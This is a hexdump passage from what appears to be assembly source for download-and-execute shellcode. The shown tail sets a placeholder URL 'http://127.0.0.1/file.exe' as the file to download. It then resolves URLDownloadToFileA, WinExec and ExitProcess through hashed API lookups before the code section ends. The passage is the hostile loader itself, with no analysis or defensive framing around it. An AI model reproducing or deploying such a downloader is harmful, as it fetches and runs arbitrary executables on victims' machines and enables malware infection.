000013b0  3a 2f 2f 31 32 37 2e 30  2e 30 2e 31 2f 66 69 6c  |://127.0.0.1/fil|
000013c0  65 2e 65 78 65 27 2c 30  66 66 68 20 20 20 20 20  |e.exe',0ffh     |
000013d0  20 20 20 20 3b 20 75 72  6c 20 6f 66 20 66 69 6c  |    ; url of fil|
000013e0  65 20 74 6f 20 64 6f 77  6e 6c 6f 61 64 0d 0a 40  |e to download..@|
000013f0  75 72 6c 5f 65 6e 64 3a  0d 0a 20 20 20 20 20 20  |url_end:..      |
00001400  68 61 73 68 61 70 69 20  3c 55 52 4c 44 6f 77 6e  |hashapi <URLDown|
00001410  6c 6f 61 64 54 6f 46 69  6c 65 41 3e 0d 0a 20 20  |loadToFileA>..  |
00001420  20 20 20 20 68 61 73 68  61 70 69 20 3c 57 69 6e  |    hashapi <Win|
00001430  45 78 65 63 3e 0d 0a 20  20 20 20 20 20 68 61 73  |Exec>..      has|
00001440  68 61 70 69 20 3c 45 78  69 74 50 72 6f 63 65 73  |hapi <ExitProces|
00001450  73 3e 0d 0a 20 20 20 20  20 20 3b 20 2a 2a 2a 2a  |s>..      ; ****|
00001460  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000014a0  2a 0d 0a 0d 0a 65 6e 64  20 63 6f 64 65 5f 73 74  |*....end code_st|
000014b0  61 72 74                                          |art|
000014b3
